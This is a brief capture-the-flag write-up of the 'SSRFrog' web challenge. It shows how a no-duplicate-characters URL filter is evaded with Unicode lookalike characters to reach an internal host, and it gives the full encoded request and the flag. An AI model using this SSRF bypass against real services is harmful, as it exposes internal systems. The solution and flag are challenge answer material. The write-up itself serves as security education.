# SSRFrog (Web)
SSRF challenge, the source tells us the flag is on `http://the.c0o0o0l-fl444g.server.internal`. We also see that our URL cannot contain any duplicate characters BEFORE being parsed.

The first thing to find is that the URL will be accepted even if the `//` are missing, which eases our burden a bit.

For the rest of the characters, we can use unicode characters considered equivalent to bypass these restrictions. These include different cases, circled letters/numbers, etc.

URL: `htTP:ⓣHe｡c⓪o０O0l-fL4④４g.sErvⓔR．inⓉｅⓡNaⓛ`

```
http://chall.ctf.bamboofox.tw:9453/?url=htTP:%E2%93%A3He%EF%BD%A1c%E2%93%AAo%EF%BC%90O0l-fL4%E2%91%A3%EF%BC%94g.sErv%E2%93%94R%EF%BC%8Ein%E2%93%89%EF%BD%85%E2%93%A1Na%E2%93%9B
flag{C0o0o0oL_baby_ssrf_trick}

```
